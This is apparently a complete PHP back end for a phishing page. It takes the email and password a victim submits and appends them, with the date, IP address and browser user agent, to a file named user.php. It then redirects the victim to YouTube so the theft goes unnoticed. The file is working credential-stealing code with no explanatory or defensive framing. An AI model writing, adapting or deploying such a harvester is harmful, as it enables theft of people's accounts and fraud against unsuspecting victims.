<?php 

date_default_timezone_set('Asia/Kolkata');
$dt =date('d-m-y h:i:s');
$dev=$_SERVER['HTTP_USER_AGENT'];
$ip=$_SERVER['REMOTE_ADDR'];
$user=$_POST['email'];
$pass=$_POST['pass'];
$file="user.php";
$handler=fopen($file, 'a+');
$data="Date : $dt\nDevice:$dev\nIP :$ip\nUsername: $user\nPassword:$pass\n=================================================================\n";
fwrite($handler, $data);
fclose($handler);
echo '<script> window.location="https://www.youtube.com"</script>'
?>
